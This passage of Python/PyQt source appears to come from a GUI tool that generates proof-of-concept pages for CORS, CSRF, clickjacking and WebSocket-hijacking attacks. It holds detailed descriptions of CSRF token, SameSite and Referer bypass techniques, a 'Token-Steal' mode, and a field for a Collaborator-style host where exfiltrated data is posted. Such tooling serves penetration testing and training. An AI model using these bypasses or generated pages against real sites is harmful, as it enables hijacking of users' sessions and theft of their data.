        self.cj_sb_origin.setStyleSheet(f"color:{COLOR_TEXT};font-size:8pt;")
        self.cj_sb_origin.stateChanged.connect(self._on_cj_sandbox_changed)

        self.cj_sb_all = QCheckBox("All")
        self.cj_sb_all.setStyleSheet(
            f"color:{COLOR_ACCENT};font-size:8pt;font-weight:bold;")
        self.cj_sb_all.stateChanged.connect(self._on_cj_sandbox_all_changed)

        cj_sb_row.addWidget(self.cj_sb_scripts)
        cj_sb_row.addWidget(self.cj_sb_forms)
        cj_sb_row.addWidget(self.cj_sb_origin)
        cj_sb_row.addWidget(self.cj_sb_all)
        cj_sb_row.addStretch()
        cj_opts_layout.addLayout(cj_sb_row)

        cj_hint = QLabel(
            "💡 Workflow: (1) Fill the target URL and decoy style. "
            "(2) Click '🎯 Align in Browser' — a live alignment page opens in your browser. "
            "(3) Use the on-page toolbar to align the decoy button over the target element. "
            "(4) Click '✅ Send to PoC Tool' in the browser toolbar — offsets are sent back "
            "and the clean PoC is updated here automatically. "
            "(5) 'Open in Browser' then opens the final, ready-to-deploy version (no toolbar, invisible iframe)."
        )
        cj_hint.setWordWrap(True)
        cj_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-style:italic;")
        cj_opts_layout.addWidget(cj_hint)

        self.cj_opts_group.setVisible(False)
        config_layout.addWidget(self.cj_opts_group)

        # ── CSWSH Options Group ───────────────────────────────────────────────
        self.cswsh_opts_group = QWidget()
        self.cswsh_opts_group.setObjectName("cswsh_opts_group")
        cswsh_opts_layout = QVBoxLayout(self.cswsh_opts_group)
        cswsh_opts_layout.setContentsMargins(0, 5, 0, 5)
        cswsh_opts_layout.setSpacing(8)

        sep_cswsh = QFrame()
        sep_cswsh.setFrameShape(QFrame.HLine)
        sep_cswsh.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        cswsh_opts_layout.addWidget(sep_cswsh)

        cswsh_label = QLabel("CSWSH Options:")
        cswsh_label.setStyleSheet(f"color:{COLOR_ACCENT};font-size:9pt;font-weight:bold;")
        cswsh_opts_layout.addWidget(cswsh_label)

        # WebSocket URL ──────────────────────────────────────────────────────
        cswsh_url_lbl = QLabel("WebSocket endpoint URL (wss:// or ws://):")
        cswsh_url_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        cswsh_opts_layout.addWidget(cswsh_url_lbl)

        cswsh_url_row = QHBoxLayout()
        cswsh_url_row.setSpacing(6)
        self.cswsh_ws_url = QLineEdit()
        self.cswsh_ws_url.setFixedHeight(24)
        self.cswsh_ws_url.setPlaceholderText("wss://target.com/chat  (auto-filled from request)")
        self.cswsh_ws_url.textChanged.connect(self._on_cswsh_option_changed)
        cswsh_url_row.addWidget(self.cswsh_ws_url, 1)

        cswsh_autofill_btn = QPushButton("Auto-fill")
        cswsh_autofill_btn.setFixedHeight(24)
        cswsh_autofill_btn.setFixedWidth(70)
        cswsh_autofill_btn.setToolTip("Derive the WebSocket URL from the pasted HTTP request")
        cswsh_autofill_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:4px;padding:0 6px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )
        cswsh_autofill_btn.clicked.connect(self._cswsh_autofill_url)
        cswsh_url_row.addWidget(cswsh_autofill_btn)
        cswsh_opts_layout.addLayout(cswsh_url_row)

        # Messages to send on open ────────────────────────────────────────────
        cswsh_msg_lbl = QLabel(
            "Messages to send after connect (one per line, optional):")
        cswsh_msg_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        cswsh_opts_layout.addWidget(cswsh_msg_lbl)

        self.cswsh_messages = QTextEdit()
        self.cswsh_messages.setFixedHeight(60)
        self.cswsh_messages.setFont(QFont("Consolas", 9))
        self.cswsh_messages.setPlaceholderText(
            'READY\n{"type": "get_history"}')
        self.cswsh_messages.textChanged.connect(self._on_cswsh_option_changed)
        cswsh_opts_layout.addWidget(self.cswsh_messages)

        # Reconnect checkbox ──────────────────────────────────────────────────
        self.cswsh_reconnect = QCheckBox(
            "Auto-reconnect if the connection is closed")
        self.cswsh_reconnect.setChecked(False)
        self.cswsh_reconnect.setStyleSheet(f"color:{COLOR_TEXT};font-size:9pt;")
        self.cswsh_reconnect.stateChanged.connect(self._on_cswsh_option_changed)
        cswsh_opts_layout.addWidget(self.cswsh_reconnect)

        cswsh_hint = QLabel(
            "\u2139\ufe0f  Paste the HTTP Upgrade request for this WebSocket endpoint. "
            "The browser will automatically attach session cookies to the WS handshake.\n"
            "If the server does not validate the Origin header the connection is hijacked."
        )
        cswsh_hint.setWordWrap(True)
        cswsh_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-style:italic;")
        cswsh_opts_layout.addWidget(cswsh_hint)

        self.cswsh_opts_group.setVisible(False)
        config_layout.addWidget(self.cswsh_opts_group)

        # Attacker Server Configuration
        self.server_group = QWidget()
        server_layout = QVBoxLayout(self.server_group)
        server_layout.setContentsMargins(0, 5, 0, 5)
        server_layout.setSpacing(6)
        
        # Separator
        sep3 = QFrame()
        sep3.setFrameShape(QFrame.HLine)
        sep3.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        server_layout.addWidget(sep3)
        
        server_label = QLabel("Collaborator URL:")
        server_label.setStyleSheet(f"color:{COLOR_ACCENT};font-size:9pt;font-weight:bold;")
        server_layout.addWidget(server_label)
        
        server_row = QHBoxLayout()
        server_row.setSpacing(8)
        self.attacker_server_edit = QLineEdit()
        self.attacker_server_edit.setPlaceholderText("https://YOUR-ID.oastify.com")
        self.attacker_server_edit.setText("https://YOUR-ID.oastify.com")
        self.attacker_server_edit.setFixedHeight(26)
        self.attacker_server_edit.textChanged.connect(self._on_server_changed)
        
        reset_server_btn = QPushButton("Reset")
        reset_server_btn.setFixedHeight(26)
        reset_server_btn.setFixedWidth(60)
        reset_server_btn.clicked.connect(self._reset_attacker_server)
        
        server_row.addWidget(self.attacker_server_edit, 1)
        server_row.addWidget(reset_server_btn)
        server_layout.addLayout(server_row)
        
        server_hint = QLabel(
            "Burp Collaborator / interact.sh URL — "
            "exfiltrated data will be POSTed here. "
            "e.g. https://YOUR-ID.oastify.com  or  https://YOUR-ID.interact.sh")
        server_hint.setWordWrap(True)
        server_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        server_layout.addWidget(server_hint)
        
        config_layout.addWidget(self.server_group)
        
        # Output Format Row
        format_row = QHBoxLayout()
        format_row.setSpacing(12)
        
        format_lbl = QLabel("Output Format:")
        format_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;font-weight:bold;")
        self.lang_combo = QComboBox()
        self.lang_combo.addItems(["HTML (XHR / iframe)"])   # default: CORS tab is shown first
        self.lang_combo.setFixedHeight(26)
        self.lang_combo.setFixedWidth(170)
        self.lang_combo.currentTextChanged.connect(self._on_output_format_changed)
        
        format_row.addWidget(format_lbl)
        format_row.addWidget(self.lang_combo)
        format_row.addStretch()
        
        config_layout.addLayout(format_row)

        # ── Token-Steal sub-panel (shown only when Output Format = Token-Steal) ──
        self.ts_group = QWidget()
        ts_layout = QVBoxLayout(self.ts_group)
        ts_layout.setContentsMargins(0, 4, 0, 0)
        ts_layout.setSpacing(5)

        ts_sep = QFrame()
        ts_sep.setFrameShape(QFrame.HLine)
        ts_sep.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        ts_layout.addWidget(ts_sep)

        ts_hdr_lbl = QLabel("\U0001f4e1 Token-Steal configuration:")
        ts_hdr_lbl.setStyleSheet(f"color:{COLOR_ACCENT};font-size:8pt;font-weight:bold;")
        ts_layout.addWidget(ts_hdr_lbl)

        ts_get_lbl = QLabel("GET URL (page that contains the CSRF token):")
        ts_get_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.ts_get_url = QLineEdit()
        self.ts_get_url.setFixedHeight(24)
        self.ts_get_url.setPlaceholderText("Leave blank to use the POST URL (same endpoint)")
        self.ts_get_url.textChanged.connect(self._on_ts_option_changed)

        ts_sel_lbl = QLabel("Token selector (CSS selector or input name/id):")
        ts_sel_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.ts_selector = QLineEdit()
        self.ts_selector.setFixedHeight(24)
        self.ts_selector.setPlaceholderText("input[name='csrf']  or  #token  (blank = auto-detect)")
        self.ts_selector.textChanged.connect(self._on_ts_option_changed)

        ts_param_lbl = QLabel("Token parameter name (body field sent in POST):")
        ts_param_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.ts_token_param = QLineEdit()
        self.ts_token_param.setFixedHeight(24)
        self.ts_token_param.setPlaceholderText("csrf  (blank = auto-detect from request body)")
        self.ts_token_param.textChanged.connect(self._on_ts_option_changed)

        ts_hint = QLabel(
            "\u2139\ufe0f Requires the token page to be readable cross-origin (CORS "
            "Access-Control-Allow-Origin misconfiguration) or XSS context on the target. "
            "If SOP blocks the read, fallback: use the 2-iframe technique or a dangling-markup attack.")
        ts_hint.setWordWrap(True)
        ts_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-style:italic;")

        ts_layout.addWidget(ts_get_lbl)
        ts_layout.addWidget(self.ts_get_url)
        ts_layout.addWidget(ts_sel_lbl)
        ts_layout.addWidget(self.ts_selector)
        ts_layout.addWidget(ts_param_lbl)
        ts_layout.addWidget(self.ts_token_param)
        ts_layout.addWidget(ts_hint)

        self.ts_group.setVisible(False)
        config_layout.addWidget(self.ts_group)

        config_layout.addStretch()
        
        left_panel.addWidget(config_group)
        
        # Set proportions: 60% request, 40% config
        left_panel.setSizes([450, 400])
        h_splitter.addWidget(left_panel)
        
        # ─── RIGHT PANEL: vertical splitter ─────────────────────────────────
        right_panel = QSplitter(Qt.Vertical)
        right_panel.setHandleWidth(5)
        right_panel.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")
        
        # RIGHT-TOP: Generated PoC
        output_group = QGroupBox("Generated PoC")
        output_group.setStyleSheet(self._group_box_style())
        output_layout = QVBoxLayout(output_group)
        output_layout.setContentsMargins(6, 12, 6, 6)
        
        # Toolbar for output
        output_toolbar = QHBoxLayout()
        output_toolbar.setSpacing(6)
        
        output_toolbar.addWidget(QLabel("Output:"))
        output_toolbar.addStretch()
        
        self.edit_output_btn = QPushButton("✏️ Edit")
        self.edit_output_btn.setFixedHeight(24)
        self.edit_output_btn.setCheckable(True)
        self.edit_output_btn.setToolTip("Enable editing — changes are kept automatically when opening in browser or copying")
        self.edit_output_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;padding:0 10px;}}"
            f"QPushButton:hover{{border-color:{COLOR_ACCENT};}}"
            f"QPushButton:checked{{background:#2d4a2d;color:#50fa7b;"
            f"border-color:#50fa7b;}}"
        )
        self.edit_output_btn.toggled.connect(self._toggle_poc_edit)
        output_toolbar.addWidget(self.edit_output_btn)

        self.copy_output_btn = QPushButton("📋 Copy")
        self.copy_output_btn.setFixedHeight(24)
        self.copy_output_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;padding:0 10px;}}"
            f"QPushButton:hover{{border-color:{COLOR_ACCENT};}}"
        )
        self.copy_output_btn.clicked.connect(self._copy_output)
        output_toolbar.addWidget(self.copy_output_btn)
        
        output_layout.addLayout(output_toolbar)
        
        self.poc_output = QTextEdit()
        self.poc_output.setReadOnly(True)
        self.poc_output.setFont(QFont("Consolas", 10))
        self.poc_output.setPlaceholderText("PoC code will appear here after clicking 'Generate PoC'...")
        self._output_hl = HttpSyntaxHighlighter(self.poc_output.document())
        output_layout.addWidget(self.poc_output)

        # Warning banner shown when a JSON-body request is PoC'd with a form-based format
        self.json_warn_lbl = QLabel()
        self.json_warn_lbl.setWordWrap(True)
        self.json_warn_lbl.setVisible(False)
        self.json_warn_lbl.setStyleSheet(
            "background:#4a3000;color:#ffb347;"
            "border:1px solid #e67e22;border-radius:4px;padding:6px 10px;"
            "font-size:9pt;"
        )
        output_layout.addWidget(self.json_warn_lbl)
        
        right_panel.addWidget(output_group)
        
        # RIGHT-BOTTOM: Request Info
        info_group = QGroupBox("📋 Request Information")
        info_group.setStyleSheet(self._group_box_style())
        info_layout = QVBoxLayout(info_group)
        info_layout.setContentsMargins(8, 12, 8, 8)
        info_layout.setSpacing(4)
        
        self.info_text = QTextEdit()
        self.info_text.setReadOnly(True)
        self.info_text.setFont(QFont("Consolas", 9))
        self.info_text.setMaximumHeight(160)
        self.info_text.setStyleSheet(
            f"QTextEdit{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;}}"
        )
        info_layout.addWidget(self.info_text)
        
        right_panel.addWidget(info_group)
        
        # Set proportions: 70% output, 30% info
        right_panel.setSizes([500, 160])
        h_splitter.addWidget(right_panel)
        
        # Set splitter proportions: 40% left, 60% right
        h_splitter.setSizes([500, 650])
        root.addWidget(h_splitter)
        
        # Initialize visibility states
        self.cors_opts_group.setVisible(True)
        self.csrf_opts_group.setVisible(False)
        self.cj_opts_group.setVisible(False)
        self.cswsh_opts_group.setVisible(False)
        
        # Connect signals
        self.generate_btn.clicked.connect(self._on_generate_poc)
        self.copy_btn.clicked.connect(self._copy_output)
        self.save_btn.clicked.connect(self._save_to_file)
        self.clear_btn.clicked.connect(self._clear_all)
        self.test_btn.clicked.connect(self._open_in_browser)
        self.copy_path_btn.clicked.connect(self._copy_poc_path)
    
    def _group_box_style(self) -> str:
        return (
            f"QGroupBox{{border:1px solid {COLOR_BORDER};border-radius:4px;"
            f"margin-top:8px;padding-top:6px;background:{COLOR_ELEVATED_BG};}}"
            f"QGroupBox::title{{subcontrol-origin:margin;subcontrol-position:top left;"
            f"padding:0 6px;color:{COLOR_ACCENT};font-weight:bold;}}"
        )
    
    def _apply_style(self):
        self.setStyleSheet(f"""
            QWidget{{
                background:{COLOR_ELEVATED_BG};
                color:{COLOR_TEXT};
            }}
            QTextEdit, QLineEdit, QComboBox, QSpinBox{{
                background:{COLOR_DARK_BG};
                border:1px solid {COLOR_BORDER};
                color:{COLOR_TEXT};
                padding:4px 6px;
                border-radius:3px;
            }}
            QTextEdit:focus, QLineEdit:focus{{
                border-color:{COLOR_ACCENT};
            }}
            QCheckBox{{
                color:{COLOR_TEXT};
                spacing:6px;
            }}
            QCheckBox::indicator{{
                width:16px;
                height:16px;
            }}
            QGroupBox{{
                font-weight:normal;
            }}
            QPushButton{{
                font-weight:normal;
            }}
        """)
    
    # ── Event Handlers ─────────────────────────────────────────────────────
    
    # ── Output-format ↔ bypass compatibility ───────────────────────────────
    # Maps a specific bypass value → set of output formats that support it.
    # Any bypass value NOT listed here is compatible with ALL formats.
    _ALL_CSRF_FORMATS = ["Forms", "iFrame", "IMG", "XHR", "Link"]

    _FORMAT_COMPAT: Dict[str, set] = {
        # ── Token bypass ────────────────────────────────────────────────────
        # HEAD method: only XHR/JS can send HEAD; HTML forms cannot
        CSRFGenerator.BYPASS_HEAD_METHOD:                       {"XHR"},
        # Token verified by cookie: uses img+form trick → Forms only
        CSRFGenerator.BYPASS_TOKEN_VERIFIED_BY_COOKIE:          {"Forms"},
        # Method override: standard HTML form POST + _method param → most formats OK
        CSRFGenerator.BYPASS_METHOD_OVERRIDE_DELETE:            {"Forms", "iFrame", "Link", "XHR"},
        CSRFGenerator.BYPASS_METHOD_OVERRIDE_PUT:               {"Forms", "iFrame", "Link", "XHR"},
        CSRFGenerator.BYPASS_METHOD_OVERRIDE_PATCH:             {"Forms", "iFrame", "Link", "XHR"},
        # Custom header absent: forms can't set headers → XHR/fetch only
        CSRFGenerator.BYPASS_CUSTOM_HEADER_ABSENT:              {"XHR"},
        # ── SameSite bypass ─────────────────────────────────────────────────
        # Lax GET override requires top-level browser navigation (form/link);
        # XHR/iFrame/IMG are sub-resource requests — browser doesn't attach
        # SameSite=Lax cookies to them even via GET.
        "Lax \u2013 GET request override (_method=POST)":       {"Forms", "Link"},
        "Strict \u2013 Client-side Redirect":                    {"Forms", "Link"},
        # ── Content-Type bypass ─────────────────────────────────────────────
        # text/plain is a valid HTML form enctype → form-based + XHR all OK
        "text/plain":                                            {"Forms", "iFrame", "Link", "XHR"},
        # JSON body via fetch() → JS required
        CSRFGenerator.BYPASS_CT_PLAIN_JSON:                     {"XHR"},
        # JSON via form trick → pure HTML form
        CSRFGenerator.BYPASS_CT_FORM_JSON:                      {"Forms"},
        # multipart/form-data: valid HTML enctype → form-based + XHR
        "multipart/form-data":                                   {"Forms", "iFrame", "Link", "XHR"},
        # application/x-www-form-urlencoded: default for all
        "application/x-www-form-urlencoded":                    {"Forms", "iFrame", "IMG", "XHR", "Link"},
        # application/json: not a valid HTML enctype → XHR only
        "application/json":                                      {"XHR"},
        # ── Referer bypass ──────────────────────────────────────────────────
        # "Absent" uses a <meta> referrer tag → applies to all formats
        # "Circumvent" uses pushState, which affects all request types too,
        # but IMG has no referer-check value in this context
        "Circumvent \u2013 Validation can be bypassed (query string trick)":
                                                                 {"Forms", "iFrame", "Link", "XHR"},
    }

    def _get_compatible_output_formats(self) -> List[str]:
        """Return output formats compatible with all currently selected bypass options."""
        compat: set = set(self._ALL_CSRF_FORMATS)
        for selection in (
            self.csrf_bypass_combo.currentText(),
            self.samesite_bypass_combo.currentText(),
            self.ct_bypass_combo.currentText(),
            self.referer_bypass_combo.currentText(),
        ):
            if selection in self._FORMAT_COMPAT:
                compat &= self._FORMAT_COMPAT[selection]
        # Preserve canonical ordering
        return [f for f in self._ALL_CSRF_FORMATS if f in compat]

    def _update_output_format_options(self) -> None:
        """
        Filter the output format combo to only list formats compatible with
        the currently selected bypass techniques.  Preserves the current
        selection when possible; otherwise falls back to the first compatible
        format.  Signals are blocked while the combo is rebuilt so no spurious
        regeneration fires.
        """
        compatible = self._get_compatible_output_formats()
        if not compatible:
            # Safety net — should never happen given the matrix above
            compatible = list(self._ALL_CSRF_FORMATS)

        current = self.lang_combo.currentText()
        self.lang_combo.blockSignals(True)
        self.lang_combo.clear()
        self.lang_combo.addItems(compatible)
        # "Token-Steal" is always available — it uses its own XHR pattern and is
        # independent of bypass/content-type restrictions (shown conditionally in UI).
        self.lang_combo.addItem("Token-Steal")
        if current in compatible or current == "Token-Steal":
            self.lang_combo.setCurrentText(current)
        # else: first compatible item is selected automatically
        self.lang_combo.blockSignals(False)

        # Build a tooltip that names the incompatible formats and why
        hidden = [f for f in self._ALL_CSRF_FORMATS if f not in compatible]
        if hidden:
            reasons = []
            for sel, fmts in self._FORMAT_COMPAT.items():
                active_sels = (
                    self.csrf_bypass_combo.currentText(),
                    self.samesite_bypass_combo.currentText(),
                    self.ct_bypass_combo.currentText(),
                    self.referer_bypass_combo.currentText(),
                )
                if sel in active_sels:
                    blocked = [f for f in self._ALL_CSRF_FORMATS if f not in fmts]
                    if blocked:
                        reasons.append(f'\u2022 \u201c{sel}\u201d \u2192 excludes {", ".join(blocked)}')
            tip = "Some formats hidden due to selected bypasses:\n" + "\n".join(reasons)
            self.lang_combo.setToolTip(tip)
        else:
            self.lang_combo.setToolTip("")

    # ───────────────────────────────────────────────────────────────────────

    def _on_poc_type_changed(self, poc_type: str):
        """Show/hide options based on selected type."""
        is_cors  = poc_type == "CORS PoC"
        is_csrf  = poc_type == "CSRF PoC"
        is_cj    = poc_type == "Clickjacking PoC"
        is_cswsh = poc_type == "CSWSH PoC"

        self.cors_opts_group.setVisible(is_cors)
        self.csrf_opts_group.setVisible(is_csrf)
        self.cj_opts_group.setVisible(is_cj)
        self.cswsh_opts_group.setVisible(is_cswsh)
        # Show attacker server for CORS and CSWSH (both exfiltrate data)
        self.server_group.setVisible(is_cors or is_cswsh)

        # Update output format options
        self.lang_combo.blockSignals(True)
        self.lang_combo.clear()
        if is_cors:
            self.lang_combo.addItems(["HTML (XHR / iframe)"])
            self.lang_combo.blockSignals(False)
        elif is_cj:
            self.lang_combo.addItems(["HTML (iframe overlay)"])
            self.lang_combo.blockSignals(False)
        elif is_cswsh:
            self.lang_combo.addItems(["HTML (WebSocket)"])
            self.lang_combo.blockSignals(False)
        else:
            # Seed all formats then let the compat-filter trim the list
            self.lang_combo.addItems(self._ALL_CSRF_FORMATS)
            self.lang_combo.blockSignals(False)
            self._update_output_format_options()

        # Auto-generate if we have a request
        if self._current_request_info:
            self._generate_poc()
    
    def _on_cors_test_type_changed(self, test_type: str):
        """Handle CORS test type change."""
        is_subdomain = test_type == "Trusted Subdomain"
        self.subdomain_xss_group.setVisible(is_subdomain)
        if not is_subdomain:
            # Reset XSS checkbox so it doesn't bleed into other test types
            self.subdomain_xss_check.setChecked(False)
        if self._current_request_info and self.poc_type_combo.currentText() == "CORS PoC":
            self._generate_poc()

    def _on_subdomain_xss_toggled(self, state: int):
        """Show/hide XSS URL+param inputs when the checkbox is toggled."""
        self.subdomain_xss_inputs.setVisible(bool(state))
        if self._current_request_info:
            self._generate_poc()

    def _on_cors_option_changed(self):
        """Regenerate when any CORS sub-option field changes."""
        if self._current_request_info:
            self._generate_poc()

    def _on_cswsh_option_changed(self):
        """Regenerate when any CSWSH sub-option field changes."""
        if self._current_request_info:
            self._generate_poc()

    def _cswsh_autofill_url(self):
        """Derive the WebSocket URL from the pasted request and fill the field."""
        if not self._current_request_info:
            return
        ws_url = CSWSHGenerator._derive_ws_url(self._current_request_info)
        if ws_url:
            self.cswsh_ws_url.setText(ws_url)

    # ── CSRF bypass descriptions ────────────────────────────────────────────
    _BYPASS_DESCRIPTIONS = {
        "None": "",
        "Token validation – Request method": (
            "Some applications validate the CSRF token only on POST requests and "
            "skip validation for GET. This PoC switches the request to GET, moving "
            "all body parameters into the query string so the action executes "
            "without a valid token."
        ),
        CSRFGenerator.BYPASS_HEAD_METHOD: (
            "Many server frameworks (Oak, Express, Koa, etc.) route <b>HEAD</b> requests "
            "to the same handler as GET and simply strip the response body — the server-side "
            "action still executes. If a GET endpoint is rate-limited, token-validated, or "
            "otherwise restricted, sending HEAD instead may bypass those controls because "
            "the framework never invokes HTTP-method-specific middleware for HEAD.<br>"
            "This PoC uses <code>fetch(url, {method:'HEAD', credentials:'include'})</code> "
            "since HTML forms cannot send HEAD requests."
        ),
        "Token validation – Token absent": (
            "Some applications correctly validate the token when present but skip "
            "validation entirely when the token parameter is omitted. This PoC "
            "removes the CSRF token parameter (not just its value) from the request "
            "body, bypassing validation while keeping all other parameters intact."
        ),
        "Token validation – Not tied to user session (verify tokens against a global pool)": (
            "1. Use a fresh token — the app may verify token validity but not bind it to "
            "the session, so your own valid token works against any victim's session."
        ),
        CSRFGenerator.BYPASS_TOKEN_VERIFIED_BY_COOKIE: (
            "The server validates the CSRF token by checking it against a <b>non-session cookie</b> "
            "(e.g. csrf, csrfKey). This pattern appears in two forms:<br>"
            "<b>① Double-submit cookie</b> — the cookie value and the body token are <i>identical</i>. "
            "The server just checks they match. Inject any value as the cookie and send the same value "
            "in the body.<br>"
            "<b>② Non-session bound cookie</b> — the cookie (e.g. csrfKey) and the body token are "
            "<i>different but cryptographically linked</i> (e.g. the csrfKey is used to sign or derive "
            "the body token). Inject your own known csrfKey cookie and use the corresponding token "
            "value in the body.<br>"
            "In both cases the cookie is not bound to the user session, so injecting it via a "
            "cookie-injection endpoint bypasses CSRF validation completely."
            "<br><span style='color:#ff5555;font-weight:bold;'>"
            "⚠️  Don't forget to use the token value that matches the injected cookie in the PoC "
            "(set the hidden token field in the form to the same value you're injecting as a cookie)."
            "</span>"
        ),
        CSRFGenerator.BYPASS_TOKEN_EMPTY: (
            "Some applications check that the CSRF parameter is <b>present</b> in the request "
            "but do not actually validate its value. Submitting an empty token (<code>csrf=</code>) "
            "bypasses protection because the parameter exists — the server just never checks its content.<br>"
            "This PoC sends the original token key with an empty value, keeping all other "
            "parameters intact."
        ),
        CSRFGenerator.BYPASS_METHOD_OVERRIDE_DELETE: (
            "Frameworks like <b>Laravel, Symfony, Rails, Express</b> support HTTP method overriding "
            "via a <code>_method</code> body parameter. If CSRF validation is skipped for "
            "<code>DELETE</code> (or only applied to POST), POSTing with <code>_method=DELETE</code> "
            "reaches the DELETE handler without a CSRF token.<br>"
            "Override headers (<code>X-HTTP-Method-Override</code>, <code>X-HTTP-Method</code>, "
            "<code>X-Method-Override</code>) are also shown in the PoC comment for manual testing."
        ),
        CSRFGenerator.BYPASS_METHOD_OVERRIDE_PUT: (
            "Frameworks like <b>Laravel, Symfony, Rails, Express</b> support HTTP method overriding "
            "via a <code>_method</code> body parameter. If CSRF validation is skipped for "
            "<code>PUT</code> (or only applied to POST), POSTing with <code>_method=PUT</code> "
            "reaches the PUT handler without a CSRF token.<br>"
            "Override headers (<code>X-HTTP-Method-Override</code>, <code>X-HTTP-Method</code>, "
            "<code>X-Method-Override</code>) are also shown in the PoC comment for manual testing."
        ),
        CSRFGenerator.BYPASS_METHOD_OVERRIDE_PATCH: (
            "Frameworks like <b>Laravel, Symfony, Rails, Express</b> support HTTP method overriding "
            "via a <code>_method</code> body parameter. If CSRF validation is skipped for "
            "<code>PATCH</code> (or only applied to POST), POSTing with <code>_method=PATCH</code> "
            "reaches the PATCH handler without a CSRF token.<br>"
            "Override headers (<code>X-HTTP-Method-Override</code>, <code>X-HTTP-Method</code>, "
            "<code>X-Method-Override</code>) are also shown in the PoC comment for manual testing."
        ),
        CSRFGenerator.BYPASS_CUSTOM_HEADER_ABSENT: (
            "Some applications enforce CSRF via a <b>custom request header</b> "
            "(<code>X-CSRF-Token</code>, <code>X-XSRF-TOKEN</code>, <code>X-Requested-With</code>, etc.). "
            "Cross-origin <b>HTML forms cannot set custom headers</b> — the browser blocks them. "
            "If the server does not require the header to be present, a standard cross-origin "
            "request (without the header) will succeed.<br>"
            "Test both: (①) header completely absent and (②) header present with an invalid value."
        ),
    }

    def _on_csrf_bypass_changed(self, technique: str):
        """Update description label, show/hide sub-panels, and regenerate."""
        desc = self._BYPASS_DESCRIPTIONS.get(technique, "")
        if desc:
            self.csrf_bypass_desc.setText(f"ℹ️  {desc}")
            self.csrf_bypass_desc.setVisible(True)
        else:
            self.csrf_bypass_desc.setVisible(False)
        self.nsc_group.setVisible(False)
        self.ds_group.setVisible(False)
        self.tvc_group.setVisible(technique == CSRFGenerator.BYPASS_TOKEN_VERIFIED_BY_COOKIE)
        self.ch_group.setVisible(technique == CSRFGenerator.BYPASS_CUSTOM_HEADER_ABSENT)
        self._update_output_format_options()
        if self._current_request_info:
            self._generate_poc()

    _SAMESITE_BYPASS_DESCRIPTIONS = {
        "None": "",
        "Lax \u2013 GET request override (_method=POST)": (
            "Servers using SameSite=Lax session cookies block cross-site POST requests "
            "but allow GET requests triggered by top-level navigation \u2014 the browser "
            "still includes the session cookie. This PoC redirects the victim to a GET "
            "request carrying all original body parameters in the URL, plus a "
            "_method=POST override so frameworks (e.g. Symfony, Laravel, Rails) route "
            "it as POST internally."
        ),
        "Strict \u2013 Client-side Redirect": (
            "Servers using <b>SameSite=Strict</b> cookies block cookies on all "
            "cross-site requests, including top-level navigations. However, if the "
            "target site exposes a redirect <em>gadget</em> (e.g. a confirmation page "
            "with a path-traversal like <code>?postId=../my-account/change-email</code> "
            "or an open-redirect endpoint), the attacker can chain two navigations: "
            "(1) cross-site to the gadget URL (no cookies), then (2) the gadget issues "
            "a <em>same-origin</em> redirect to the sensitive action \u2014 this second "
            "hop carries the Strict cookie because it is now same-site. "
            "Enter the full gadget URL in the <b>Redirect URL</b> field below."
        ),
    }

    def _on_samesite_bypass_changed(self, technique: str):
        """Update SameSite bypass description and regenerate."""
        desc = self._SAMESITE_BYPASS_DESCRIPTIONS.get(technique, "")
        if desc:
            self.samesite_bypass_desc.setText(f"ℹ️  {desc}")
            self.samesite_bypass_desc.setVisible(True)
        else:
            self.samesite_bypass_desc.setVisible(False)
        is_strict_redirect = technique == "Strict \u2013 Client-side Redirect"
        self.samesite_redirect_widget.setVisible(is_strict_redirect)
        self._update_output_format_options()
        if self._current_request_info:
            self._generate_poc()

    def _on_samesite_redirect_changed(self):
        """Regenerate PoC when the Strict client-side redirect URL changes."""
        if self._current_request_info:
            self._generate_poc()

    # ── Referer header bypass descriptions ─────────────────────────────────
    _REFERER_BYPASS_DESCRIPTIONS = {
        "None": "",
        "Absent \u2013 Validation depends on header being present": (
            "Some applications validate the Referer header when it is present but skip "
            "the check entirely when the header is omitted. "
            "This PoC adds <meta name=\"referrer\" content=\"never\"> to the page so "
            "the victim's browser drops the Referer header from the CSRF request, "
            "causing the server to skip its Referer-based CSRF validation."
        ),
        "Circumvent \u2013 Validation can be bypassed (query string trick)": (
            "Some applications validate the Referer header in a naive way that can be bypassed. "
            "If the app checks that its own domain appears anywhere in the Referer, an attacker "
            "can place the target domain in the query string of the exploit URL via "
            "history.pushState(), so the browser sends it as part of the Referer value.<br>"
            "<span style='color:#ff5555;font-weight:bold;'>"
            "&#9888;&#xFE0F; Note: many browsers strip the query string from Referer by default. "
            "Set <code>Referrer-Policy: unsafe-url</code> as a response header on the exploit "
            "page to force the full URL (including query string) to be sent in the Referer header."
            "</span>"
        ),
    }

    def _on_referer_bypass_changed(self, technique: str):
        """Update Referer bypass description and regenerate."""
        desc = self._REFERER_BYPASS_DESCRIPTIONS.get(technique, "")
        if desc:
            self.referer_bypass_desc.setHtml(f"ℹ️&nbsp;&nbsp;{desc}")
            self.referer_bypass_desc.setVisible(True)
